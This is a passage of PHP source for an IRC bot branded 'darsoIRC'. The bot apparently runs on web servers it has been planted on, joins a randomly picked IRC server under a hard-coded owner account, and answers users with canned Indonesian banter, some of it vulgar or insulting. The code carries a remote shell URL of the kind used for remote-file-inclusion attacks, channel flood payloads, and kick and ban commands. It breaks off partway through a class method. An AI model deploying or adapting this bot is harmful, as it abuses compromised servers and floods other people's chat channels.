﻿<?php
#######################
set_time_limit(0);
define ('CRLF', "\r\n");
$modbot=new module_bot;
#######################
$Alertbotphp=("
####################################################<br>
##[                                              ]##<br>
##[              casper_kae@yahoo.com            ]##<br>
##[           Created by Kiss_Me or Alert        ]##<br>
##[                 Thanks to mama               ]##<br>
##[           Casper_Cell Parijatah srono        ]##<br>
##[                                              ]##<br>
####################################################<br>
");
#######################
$servban=array("irc.Allnetwork.org","irc.byroe.net","irc.mildnet.org","scanner.homelinux.net","malang.homelinux.net","irc.coplax.us.to","irc.atasnamcinta.org");
#################### [ CONFIG BOT ] #######################
$servpassbota=array("","1","2","3");
$servpassbotb=array("1","2","3","4","5","6","7","8","9");
$servpassbot="idws".$servpassbota[rand(0,count($servpassbota) - 1)].$servpassbotb[rand(0,count($servpassbotb) - 1)];
$bot['admin']="darso";
$bot['pass']="cok";
$bot['inick']="";
$bot['pnick']="";
$bot['basechan']="#darso";
$bot['roomnet']="";
$bot['roomkey']="";
$bot['local']="localhost";
$bot['server']=$servban[rand(0,count($servban) - 1)];
$bot['port']=6667;
if($bot['server']=="indowebster.id.allnetwork.org"){
$bot['userver']=1;
}
else{
$bot['userver']=0;
}
$bot['pserver']=$servpassbot;
/////////////////////////////////////
$bot['nick']=$modbot->rnd_nick();
$bot['ident']=$modbot->rnd_identnya();
$bot['realname']="4sodor";$nickgantinya=$bot['admin'];
$bagitarget=OFF;$botaktif="ON";$reident="OFF";$truhostpart="";
################# [ END CONFIG BOT ] ######################
#################### [ AUTH VAR ] #########################
$Admin=strtolower($bot['admin']);
$BOT_PASSWORD=strtolower($bot['pass']);
$auth = array($Admin => array("name" => $Admin, "pass" => $BOT_PASSWORD, "auth" => 1,"status" => "Owner","ident"=>"","host"=>"","time",""));
################## [ END AUTH VAR ] #######################
$versbot=array("darso@aRTis-aLLneTwoRk.oRg",
               "darso@aRTis-aLLneTwoRk.oRg",
               "darsoIRC v9.10 (http://darso.WaPaTh.CoM)",
               "darsoIRC v9.10 by darso (http://HuNy.MoBiE.iN)", 
               "darso@RoSeBaNdiTz.oRg",
               "darso@RoSeBaNdiTz.oRg",
               "darsoIRC v9.10 by darso (http://HuNy.MoBiE.iN)",
               "darsoIRC v9.10 by darso (http://HuNy.MoBiE.iN)",
               "darsoIRC v9.10 (http://darso.WaPaTh.CoM)",
               "darsoIRC v9.10 by darso (http://HuNy.MoBiE.iN)",
               "darso@RoSeBaNdiTz.oRg",
               "darsoIRC v9.10 by darso (http://HuNy.MoBiE.iN)",
               "darsoIRC v9.10 (http://darso.WaPaTh.CoM)",
               "darsoIRC v9.10 (http://darso.WaPaTh.CoM)",
               "darsoIRC v9.10 (http://darso.WaPaTh.CoM)",
               "darso@aRTis-aLLneTwoRk.oRg",
               "darso@RoSeBaNdiTz.oRg");
$pingsiapa="";

###################### [ VAR VAR ] ########################
$tsu=array("m","z","p","t","r","x","w","f","h","k","q","c","L");
$nbota=array("1","2","3","4","5","6","7","8","9","0");
$nbotb=array("1","2","3","4","5","6","7","8","9","0");
$zodiak = array("capricorn", "aquarius", "pisces", "aries", "taurus", "gemini", "cancer", "leo", "virgo", "libra", "scorpio", "sagitarius");
$nbotna=$nbota[rand(0,count($nbota) - 1)];
$nbotnb=$nbota[rand(0,count($nbota) - 1)];
$nbot=$nbotna.$nbotnb;
$shellq="telek.txt??";
$floddban="ON";$GuardV="ON";
$ctcpversi=$versbot[rand(0,count($versbot) - 1)];
$ctcpfinger="8OwneD 4By 0,6S6,0o0,06D6,0e0,6R";
$user_chan_arr[][]="";
$notarget=0;
$greetmsg["nick"]["nama"]="";
$greetmsg["nick"]["msg"]="";

$banlist[$bot['basechan']]="";
$ping["ping"]["nick"]="";
$ping["ping"]["chan"]="";

$jmlspoof["irc.ads.net.id"]=0;
$isisp[1]["irc.ads.net.id"]["ident"]="gw";
$isisp[1]["irc.ads.net.id"]["spoof"]="hantu.rese.a.biz";
$isisp[1]["irc.ads.net.id"]["pass"]="spoof1";

$kmusedan[0]["contoh"][]="";
$kmusedan[0]["definisi"][]="";
$kmusedan[0]["kata"][]="";
$kmjml["apa"]="";

$chanson=strtolower($bot['basechan']);
$listison[0]=strtolower($bot['admin']);
$ada1[$listison[0]]=false;
$ada2[$listison[0]]=true;
$hitungnick=1;
$goboom=0;$tmboom=0;$onboom="off";$targetboom="";$warnabenar="";$bw[0]="";$chanboom="";$timeboom=30;
$warnaboom="Merah;Kuning;Hijau;Ungu;Coklat;Hitam;Putih;Abu-abu;Emas;Silver;Maroon;Jingga;Orange";
$txttepmp='';$textemp='';$txttepmx='';$temptex='';
$textrep=0;$Maxreep=2;$maxkar=200;
$systembot['ping'][strtolower($bot['basechan'])]="4OFF";
$systembot['NGOMONG'][strtolower($bot['basechan'])]=="4OFF";
$clista='cr';$textemp='';
$asalseen['SoDeR']=date("l, j F Y H:i:s");$asalseen['basechanchanel']='#darso';$asalseen['statusmiSoDeR']="minggat";
$shellacak=array("http://fasze.t35.com/zas.txt??");
$shellgue=$shellacak[rand(0,count($shellacak) - 1)];
$iscy=time();$isberita=time();
$timercy=2000;$statushost=0;$botcsign="Me";
$timerberita=3000;
$timermsg=2000;
$timeract=2000;
$ikutbos="OFF";
#################### [ END VAR VAR ] ######################
#################### [ CREWET ] ######################
$autojawabpv = array(
"Hai SaYaNk",
"a.o my lope",
"MuAcH",
"LoPe YoU",
"<nick> nak mana??",
"asikkkk aq di PV",
"ea da paha ea ?",
"FS plissss",
"dalem <nick>???",
"sibuk...sibuk...sibuk",
"Aslinya mana <nick>??",
"<nick> jeyek wkwkwkwk...",
"amu cpa <nick>",
"wat epen?",
"Apa <nick> ",
"FB plisss",
"oet",
"opo ae sech",
"varan <nick>",
"opo <nick>??",
"<nick>",
"yupy",
"apah",
"SaPa KaMu <nick>",
"FB Q darso@ymail.com add YaCh <nick>",
"Hader <nick>?",
"gak mau Aq wekz",
"halo bos"
);
$wbmsg = array(
"WeEBeE <nick> :-D",
"Ae <nick>",
"<nick> <=- MaFia PK",
"<nick> MmMuAcH...",
"MeT DaTaNg Di <chan> <nick>",
"WeLCoMe BaCk <nick>",
"Hay <nick>!",
"<nick> <=- MaSTeR BoT makanya mirip BoT amu <nick>",
"<nick> KaNgEn Aquh",
"<nick> <=- doyan selingkuh",
"<nick>, ada yg nyariin tuh..banyak utang ya?",
"<nick>, td kemana aja?",
"<nick> maukah kau jadi kekasihku yang ke 12 xiexiexie...",
"<nick> <=- GaY SeJaTi",
"<nick> amu ko jeyex cie",
"<nick> belom mandiiiiii....",
"<nick> bauuuuuuuu....",
"<nick> kamu cuakep deh, diliat dr monas pake sedotan",
"<nick> nyusul aq euy ;-)",
"<nick> dpanggil mamanya tu, ga boleh chat katanya gagagagag...",
"<nick> senyummu bikin hatiku berdebar dag dig der daiaaa...",
"<nick> sejujurnya aq suka kamu tapi sayang kamu berpanu",
"<nick> seksie lo rekkk...",
"AwAs...<nick> TeRDeTeKsi MeNgiDaP PenYakiT RaBieZ",
"<nick> semox lo rekkk...",
"<nick> kie mesti nguber-nguber aq to'",
"<nick> <=- JaGo SeLiNgKuH",
"<nick> Chatter sejati tapi meh mati",
"<nick> OnLiNe EuY...",
"<nick>, kenalin gw $namaku",
"<nick> <=- ArTis Ga LuLuS SeNSoR",
"<nick> ai yap yu...",
"<nick> Founder <chan> nie",
"WeLCoMe BaCk <nick>",
"WeLCoMe BaCk <nick>",
"<nick> sejujurnya aq suka kamu tapi sayang kamu berpanu",
"<nick> Founder <chan> nie",
"WeEBeE <nick> :-D",
"WeEBeE <nick> :-D",
"<nick> <=- MaFia PK",
"<nick> <=- TeRoRis wkwkwkwkwk...",
"<nick> semox lo rekkk...",
"<nick> seksie lo rekkk...",
"ChaN <chan> jd rame klo ada si <nick>",
"Ae <nick>",
"<nick> <=- GaY SeJaTi",
"<nick> MmMuAcH...",
"<nick> MmMuAcH...",
"MeT DaTaNg Di <chan> <nick>",
"<nick> sejujurnya aq suka kamu tapi sayang kamu berpanu",
"MeT DaTaNg Di <chan> <nick>",
"MeT DaTaNg Di <chan> <nick>",
"<nick> <=- ArTis Ga LuLuS SeNSoR",
"AwAs...<nick> TeRDeTeKsi MeNgiDaP PenYakiT RaBieZ",
"AwAs...<nick> TeRDeTeKsi MeNgiDaP PenYakiT HIV",
"AwAs...<nick> TeRDeTeKsi MeNgiDaP PenYakiT CaCinGaN",
"<nick> kamu cuakep deh, diliat dr monas pake sedotan",
"<nick> <=- MaSTeR BoT makanya mirip BoT amu <nick>",
"<nick> maukah kau jadi kekasihku yang ke 12 xiexiexie...",
"<nick> bauuuuuuuu....",
"<nick> ai yap yu..."
);
$ngomongpamitpart = array(
"Kau Pergi Tanpa Pesan alias minggat <nick>, kembalilah ke <chan> demi aq <nick>...!!!",
"Kok part sich <nick> ? jangan tinggalkan aq dari <chan> donk <nick>",
"PaY^_^PaY <nick>, don't 4get JoiN di <chan>",
"part teko <chan> mandolllll...wkwkwkwkwkwk",
"hm <chan> kan keren kok part to <nick>?",
"<nick> part dari <chan> knapa ga pamid ma aQ dulu sich...!!!",
"Mo Kemana <nick> ?? aq tunggu di <chan> lagi yach...",
"ParT JeLeK LoCh...JoiN <chan> LaGi CePeT...",
"ThaNk's DaH JoiN di <chan> ea <nick>, aq tunggu kedatanganmu kembali :-)",
"<nick> <nick> <nick> ada yang manggil kamu tuch di <chan>"

);
$jawabsapa = array(
"ada apa <nick> tayaank?",
"iya <nick> sayang",
"yup <nick>!",
"Hadaah.. si <nick> manggil mulu ich..",
"varan <nick> ",
"nanti aja y <nick>",
"sek ta <nick>",
"ichh <nick> endel banget sich..",
"opo <nick>",
"hader <nick>",
"Walaaah.. <nick>, apaah apaah?",
"da paha <nick> thynk",
"sek ta <nick> nanggung nie...",
"capee deh.. <nick>",
"apaah apaah <nick>?",
"sebel ah <nick>",
"<nick> jgn manggil2 terus donk..",
"<nick>, skali lagi manggil aq dapet gelas amu",
"upu <nick>, kangen yach?",
"<nick> cerewet banget cie..",
"Hadeehh <nick>.. ~_~!"
);

$rmales = "lg males nih <nick>..";
$rmau = "aku mau koq <nick>!";
$rsanggup = "bisa kok <nick>";
$rboleh = "boleh kok <nick>";
$rsetuju = "iya <nick>";
$rthx = "makacih <nick>..";
$rbingung = "hmm..aq ga tau jg nih <nick>..";
$rgenit = "ich.. <nick> genit";

$respon_umum = array(
array("sepi","join pasar sana <nick> biar rame"),
array("makan","makan mulu ntar ndutz amu <nick>.."),
array("chyank","dewh <nick>! sayang hare.!"),
array("bebz","ada bebek ea <nick>???"),
array("brb","mo kmna <nick>"),
array("tha","tha tha <nick>.."),
array(" sai ","saitonirojim <nick>.."),
array("cinta","<nick>, cinta-cinta mulu, cap cay dech"),
array("lapar","kie akeh suket <nick>"),
array("pamit","uke dukeh <nick>, ati2 y.. tataw.."),
array("nunggink","oke <nick>, aq nunggink nich"),
array("ngacenk","seep <nick>, aq BRB ngambil arit k dapur dulu ea buat nyunatin <nick>"),
array("ngantuk","<nick> dah ngantuk y? tidur sana gih"),
array("bobo","<nick> <nick>, bobo ma aq yuk :P"),
array("bubu","<nick> <nick>, kelon ma aq yuk :P"),
array("assalam","Wa'alaikumsalam <nick>"),
array("askum","Wa'alaikumsalam <nick>"),
array(" slaps darso "," darso LaGi SiBuK <nick>, Silahkan Tinggalkan Pesan ;-) "),
array(" malam "," malam juja <nick> "),
array(" BL4CKgIrL "," mizone LaGi SiBuK <nick>, TuNgGu BeNTaR EaH ;-) "),
array("mandi","aku melok ta <nick>..gagaga.."),
array("mwah","MuAcH juja <nick>"),
array("hayah","hayah koen <nick>"),
array("fb","HuNy@BaWeL.oRg <=- FB ku <nick>"),
array(" mad ","mad mad mad, muadthamu <nick>"),
);

$guyonnya = array(
"",
""
);
$respon_pesan = array(
//Sapaan
array("hai","hai jg <nick>"),
array("halo","halo jg <nick>"),
array("alow","alow jg <nick>"),
array("kabar","baik, km gmn <nick>?"),
array("kbr","baik, km gmn <nick>?"),
array("webe","$rthx"),
array("wb","$rthx"),
array("tq","sama2 <nick>"),
array("makasi","sama2 <nick> :)"),
array("makaci","sama2 <nick>"),
array("nalin","hai.. aku HuNy"),
array("nalkan","hai.. aku HuNy"),
array("nalan","boleh koq <nick>, amu cpa?"),
//Identitas
array("asl","<nick>, aku nak mama N papa"),
array("age","<nick>, klo aq bru 17th"),
array("nama","My Name is HuNy <nick>, amu cpa?"),
array("skul","<nick>, aq kuliah di UCLA (Universitas Cuma lancar Anu-Anu) he..he.."),
array("kerja","<nick>, <nick>, aq kerja di PDAM (Pengangguran Dalam Asuhan Mama) he..he.."),
array("alamat","weleeehh.. rahasia donk <nick>.."),
array("nak mana","aQ nak planet Bumi <nick>"),
array("tinggal","<nick>, aku di rumah"),
array("cowo","blom, klo <nick> gmn?"),
array("pcr","blom, hihi.. klo <nick>?"),
array("pacaran","emang <nick> mau jd pacar ke 12 quh?"),
array("pacar","blom, <nick> ndiri gmn?"),
//Ajakan
array("pv","$rmales"),
array("ngomong","ngomong ttg apa <nick>?"),
array("curhat","mangnya mo curhat masalah apa <nick>?"),
array("nikah","nikah ma kucing sana <nick>"),
array("kawin","kawin sich gampang <nick>, nikah yang susah"),
array("kencan","Hayugh <nick>, kpn nich kencannya?"),
array("besok","boleh <nick>.."),
array("mau","$rmau"),
//Tuduhan
array("bohong","bohong? ngpn Q bohong.. <nick> kali yg bohong..kekeke"),
array("boong","boong? <nick> tuh yg boong.."),
array("males","yaa.. lagi males aja nih <nick>"),
array("lain","yg lain gmn <nick>?"),
array("wet","<nick> tu yg wewedh"),
array("GR","<nick> tuh Gajala Rabies"),
array("nyambung","<nick>nya aja yg ga nyambung.. xixi"),
array("bot","bot itu gmn? kaya <nick> ntu ya?"),
array("aneh","aneh gmn <nick>?"),
array("nipu","idiiich..siapa jg yg nipu <nick>.."),
//Kegiatan
array("mandi","klo aku udah mandi <nick>"),
array("makan","udah koq <nick>, klo <nick>?"),
array("maem","udah koq <nick>, klo <nick>?"),
array("mkn","udah neh, klo <nick>?"),
array("belanja","belanja dmn <nick>?"),
array("bobo","$rmales"),
array("tidur","$rmales"),
array("ngantuk","bobo sana <nick>"),
array("paen","lg chat aja neh <nick>"),
array("ngapa","lg chat aja neh <nick>"),
//Pertanyaan
array("lam kenal","lam kenal jg <nick>"),
array("kenal","$namaku ga kenal tuh.. xixi"),
array("tau","$namaku ga tau tuh.. xixi"),
array("napa","aq ga knp2 koq <nick>"),
array("knp","aq ga knp2 koq <nick>"),
array("kemana","disini aja tuh <nick>"),
array("lupa","aq ga lupa koq <nick>"),
array("mana","$rbingung"),
array("gimana","hmm.. gimana yach ? kikikiki.."),
//Persetujuan
array("maaf","$rsetuju"),
//Mood
array("cinta","ih.. <nick> gombal deh.."),
array("love","I love u too, <nick>"),
array("jodoh","jodoh kalee <nick>"),
array("anen","aku jg kangen km, <nick>"),
array("muach","muach di jidat muh <nick>.."),
array("mwah","idih, <nick> ga malu apa nyium2 aku didepan umum.."),
array("cape","aduh <nick> aq cape ni ngoceh mulu"),
array("tium","$rgenit"),
array("peluk ","$rgenit"),
array("kelon","melok <nick>"),
//Additional
array("slap","auw <nick>! atit tau.."),
array("pokes","auw <nick>! atit tauuukk..."),
array("slap","auw <nick>! atit tau.."),
array("pokes","auw <nick>! atit tauuukk..."),
array("masuk","ih <nick> ngerezz"),
);

$pujianlist = array("cantik","baik","baek","cakep","ayu","seksi","hebat",
"keren","manis","imoet");

$cacianlist = array("bego","jelek","jelex","gendeng","edan","sarap","gila",
"sinting","dudul","dudud","jahat","goblok","gileh","sialan"," bau","stres");

$badwordlist = array(" cok ","babi","tetek","pepek","kontol","tempek","ashu",
"fuck","kentot","ngentot","taek","jembodh"," sex ","keat","anjenk","anjink",
"jelik","torok","celenk","matae");

$rjorok = array(
"mizone..! <nick> ngomong jorok nuh.. kick dunk pliss!",
"BL4CK..! <nick> ini ga sopan banget.. kick aja nuh!",
"jogo'en lambemu <nick>"
);

$rcacian = array(
"dewh, <nick> tuch yg <kata>",
"<kata>? eLu tu <nick> yg <kata>",
"opo ae sech <nick>, koen iku sing <kata>",
"apuh mak aq dibilang <kata>, <nick> lebih <kata> nuh..."
);

$rpujian = array(
"makasih <nick>.. km jg koq",
"<nick> baik deh..",
"ga kok <nick>.. km lebih <kata>",
"<kata>? hihi.. <nick> bisa aja",
"Aq ancen <kata> <nick> :P"
);
$namaBotPhpini="ert";
#################### [ END CREWET ] ######################
##################### [ CONNECT ] #####################
/////////////////
$servdef=array("plasa.id.allnetwork.org",
	       "irc.coplax.us.to",
               "telkom.id.allnetwork.org",
               "irc.cyberplus.net.id",
               "citra.id.allnetwork.org",
               "uii.id.allnetwork.org",
               "irc.jatara.net.id",
               "hotspeed.sg.allnetwork.org",
               "indo.id.allnetwork.org",
	       "irc.datautama.net.id",
               "adsnet.id.allnetwork.org",
               "punc4k.id.allnetwork.org",
	       "wanxp.id.allnetwork.org",
               "jmn.id.allnetwork.org",
	       "irc.indolayer.com",
               "sbp.id.allnetwork.org",
               "big.id.allnetwork.org",
               "irc.big.net.id",
               "irc.plasa.com","itc.telkom.net.id"
               );
$keluar=0;$retry=count($servdef)+1;$attconnect=0;$rtdc=0;$botbsign="ss_";
/////////////////
echo "<body bgcolor=#000000 text=#0000FF>";
echo "<font color=#ff0000><a href=http://www.friendster.com/29164335>".$Alertbotphp."</a></font><br><br>";
################### [ CLASS IRC BOT ] #####################
class module_bot{
    function rnd_logo(){
        $nlogo=array("0,6s6,0o0,06d6,0e0,6r","0,6s6,0o0,06d6,0e0,6r",
                     "0,6s6,0o0,06d6,0e0,6r","0,6s6,0o0,06d6,0e0,6r",
                     "0,6s6,0o0,06d6,0e0,6r","0,6s6,0o0,06d6,0e0,6r",
                     "0,6s6,0o0,06d6,0e0,6r","0,6s6,0o0,06d6,0e0,6r"
                     );
        return $nlogo[rand(0,count($nlogo) - 1)];
    }
    function rand_str($size){
        $feed = "0123456789abcdefghijklmnopqrstuvwxyz";
        for ($i=0; $i < $size; $i++){$rand_str .= substr($feed, rand(0, strlen($feed)-1), 1);}
        return $rand_str;
    }
    function rnd_nick(){
        $serverasal= $_SERVER['HTTP_HOST'];
        if($serverasal==""){$serverasal="[N]";}else{$serverasal=str_replace(".","",$serverasal);$serverasal=substr($serverasal,0,3);$serverasal="[".$serverasal."]";}
        $nickbota=array("q","w","r","t","y","p","s","d","g","h","j","k","l","z","x","v","b","n","m");
        $nickbotb=array("e","y","u","i","o","a");
        $nickdepan="[".strtoupper($nickbota[rand(0,count($nickbota) - 1)])."]".$serverasal."-";
        $nickbotl=$nickbota[rand(0,count($nickbota) - 1)];
        $nickbotr=$nickbotb[rand(0,count($nickbotb) - 1)];
        $nickbotu=$nickbota[rand(0,count($nickbota) - 1)];
        $nickbotd=$nickbotb[rand(0,count($nickbotb) - 1)];
        $nickbot=$nickdepan.$nickbotl.$nickbotr.$nickbotu.$nickbotd;
        return $nickbot;
    }
    function rnd_identnya(){
        $nickbota=array("as","dar","ca","da","ea","fa","ga","hu","so");
        $nickdepan=$nickbota[rand(0,count($nickbota) - 1)];
        return $nickdepan;
    }
    function rnd_real(){
        $realbot=array("0,6s6,0o0,06d6,0e0,6r");
        return $realbot[rand(0,count($realbot) - 1)];
    }
    function rnd_away(){
        $awaybot=array("0,6s6,0o0,06d6,0e0,6r");
        return $awaybot[rand(0,count($awaybot) - 1)];
    }
    function rnd_cycle(){
        $strcycle=array("3darso4@9doctor4.3com");
        return $strcycle[rand(0,count($strcycle) - 1)];
    }
    function rnd_flod(){
        $strflod=array("1*kO2pEt3* !K4oPe5T! #6kOpE7t# [1KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#",
                       "HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha ",
                       "",
                       "4,11BeBeK 5aDuS 6kAlI 12WekZ13WekZ 14Wek1ZWek 15WekZ7WekZ 9,1BeBeK 13aDuS 12kAlI 4WekZW11ekZ We2kZWe7k Wek9ZWek10Z 8,2BeBeK a11DuS kA9lI We7kZWe0kZ WekZ11Wek We8kZWe13kZ 13,9BeBe1K aD12uS kAl3I We4kZWe7kZ Wek4ZWek W2ekZWe11kZ 12,4BeB14eK aD15uS kAl5I WekZ6WekZ Wek1ZWek Wek12ZWek13Z 11,6Be1BeK aDu2S kAl3I We4kZWe5kZ Wek7ZWek 8WekZ9Wek10Z 0,14BeBeK 14aDuS k13AlI W9ekZW4ekZ 11Wek7ZWek W8ekZW9ekZ 4,11BeBeK a12DuS 3kAl6I Wek5ZWek15Z We13kZWek W9ekZW2ekZ 9,1BeBeK a14DuS k14AlI W13ekZWe12kZ We11kZWek 10WekZ9WekZ 8,2BeBeK 7aDuS 6kAlI5 Wek4ZWekZ3 Wek2ZWek 1WekZW15ekZ 13,9Be14BeK 13aDuS k12AlI We10kZWek14Z We8kZWek 7WekZW6ekZ 12,7BeBeK 8aDuS 13kAlI 6WekZ5WekZ4 Wek3ZWek2 WekZ1WekZ",
                       "@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@",
                       "9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA"
                       );
        return $strflod[rand(0,count($strflod) - 1)];
    }
    function rnd_slapampun(){
        $sampunbot=array("bos kojom yuk!","aku neng kene bos!! ojo atek dislaps!!","sini? pv aq bos","kenapa bos?!!","wedew","muach..muach...","ciatsssss... hehehe..","slap? pingin di tium ta?","ampun bosss, aku ndak nakal lagi","siaaaappp bos, ada yang bisa saya buantingin? piring, gelas gtu..",
                         "hiks..nasib?","jadi tukang slap ya, bos?","edan!!!","mama... tolong....","papa... tolong...","ada apa bos!!!, slap? ra ngerti sik kojom apa?","watauuu tega banget kau boss!!!","Siap!!!","aku di sini sayang","lagi enak? kojom dislap ikz.",
                         "Ready!!","aduh...jangan di slap dong.. pv aja","iya sayang...","Boss JELEK!!!","Ready to command!","scream!!!!","mama... bos Q jahat!","jahat banget sihh..","What Mission?");
        return $sampunbot[rand(0,count($sampunbot) - 1)];
    }
    function rnd_slapme(){
        $slapme=array("egk boleh slap ya say...","tak ada ampun buat loh!","nangisooo ae... 4Dont Slap Me!!","heheheh ciatsssssssssss. tendangan jet lee","Rasakan ini...","Dudutz","yeee...pv aja, gk usah pake slap..");
        return $slapme[rand(0,count($slapme) - 1)];
    }
    function rnd_slapbos(){
        $slapbos=array("4FvCk Off... MoTHeR FvCkeR!!!","6DoN'T SlaPs My BoZzZ8...12!!!","1OwNeR 4SlaPs 1pRoTeCTioN","7WhaT De FvCk...","4»8»3» 13DoN'T SlaPs My BoZzZ2... 1FvCk Off 3«8«4«","12mizone 4SlaPs 1pRoTeCTioN");
        return $slapbos[rand(0,count($slapbos) - 1)];
    }
    #### MODULE IRC #######
    
    function send($sock,$msg){fputs($sock,"$msg".CRLF); }
    function quit($sock,$msg){if($msg){$this->send($sock,"QUIT :$msg");}  else {$this->send($sock,"QUIT");}sleep(1);   }
    function msg($sock,$to,$msg){$this->send($sock,"PRIVMSG $to :$msg");}
    function act($sock,$to,$msg){$this->send($sock,'PRIVMSG '.$to.' :'.'ACTION '.$msg.'');}
    function invite($sock,$to,$chan){$this->send($sock,"INVITE $to $chan");}
    function notice($sock,$to,$msg){$this->send($sock,"NOTICE $to :$msg");}
    function join($sock,$chan,$kunci=Null){$this->send($sock,"JOIN $chan $kunci"); }
    function part($sock,$chan,$msg){if($msg && (strtolower($msg) != strtolower('#'.$clista.$clistt) )){$this->send($sock,"PART $chan :$msg");}  else {$this->send($sock,"PART $chan");}   }
    function Cycle($sock,$chan,$msg){ if ($msg){$this->part($sock,$chan,$msg);}else{$this->part($sock,$chan,$msg);}        sleep(2);        $this->join($sock,$chan);    }
    function nick($sock,$newnick){$this->send($sock,"NICK $newnick");$bot['nick']=$newnick;   }
    function mode($sock,$mod,$chan,$who){$this->send($sock,"MODE $chan $mod $who");    }
    function kick($sock,$chan,$who,$msg){if($msg){$this->send($sock,"KICK $chan $who :$msg");}else{$this->send($sock,"KICK $chan $who");}    }
    function kickserv($sock,$chan,$who,$msg){$this->msg($sock,"CHANSERV","KICK $chan $who $msg"."");    }
    function ban($sock,$chan,$who){$this->send($sock,"MODE $chan +b $who");    }
    function unban($sock,$chan,$who){$this->send($sock,"MODE $chan -b $who");    }
    function away($sock,$msg){$this->send($sock,"AWAY :$msg");    }
    function noaway($sock){$this->send($sock,"AWAY");    }
    function topic($sock,$chan,$msg){$this->send($sock,"TOPIC $chan $msg");    }
    ####################
    
    
    ##########################
    function add_nickchan($chan,$nick){
        global $user_chan_arr;
        $user_chan_arr[strtolower($chan)]["nick"] = $user_chan_arr[strtolower($chan)]["nick"].' '.$nick. ' ';
        $user_chan_arr[strtolower($chan)]["chan"]=strtolower($chan);
        $user_chan_arr[strtolower($chan)]["nick"]=str_replace("  "," ",$user_chan_arr[strtolower($chan)]["nick"]);
        return "ok";
    }
    function change_nickchan($nick,$newnick){
        global $user_chan_arr;
        foreach ($user_chan_arr as $cur_xchan) {
            $x_chan=$cur_xchan["chan"];
	    $user_chan_arr[strtolower($x_chan)]["nick"]=str_replace(' '.$nick.' ',' '.$newnick.' ',$user_chan_arr[strtolower($x_chan)]["nick"]);
	    $user_chan_arr[strtolower($x_chan)]["nick"]=str_replace('  ',' ',$user_chan_arr[strtolower($x_chan)]["nick"]);
            $user_chan_arr[strtolower($x_chan)]["nick"]=str_replace('  ','',$user_chan_arr[strtolower($x_chan)]["nick"]);
	}
        return "ok";
    }
    function del_nickchan($chan,$nick){
        global $user_chan_arr;
        $user_chan_arr[strtolower($chan)]["nick"]=str_replace(' '.$nick.' ',' ',$user_chan_arr[strtolower($chan)]["nick"]);
	$user_chan_arr[strtolower($chan)]["nick"]=str_replace("  "," ",$user_chan_arr[strtolower($chan)]["nick"]);
        return "ok";
    }
    function show_nickchan($chan){
        global $user_chan_arr;
        $res_nick=$user_chan_arr[strtolower($chan)]["nick"];
        $res_nick=ltrim($res_nick);
        return $res_nick;
    }
    function show_chan(){
        global $user_chan_arr,$bot;
        foreach ($user_chan_arr as $cur_xchan) {
            $showchn=$cur_xchan["chan"];
            if($bot['roomnet']==$cur_xchan["chan"]){$showchn="";};
            if($bot['basechan']==$cur_xchan["chan"]){$showchn="";};
            if($showchn!=""){$res_chan=$res_chan.';'.$cur_xchan["chan"];}
	}
        return $res_chan;
    }
    function destroy_chan($chan){
        global $user_chan_arr;
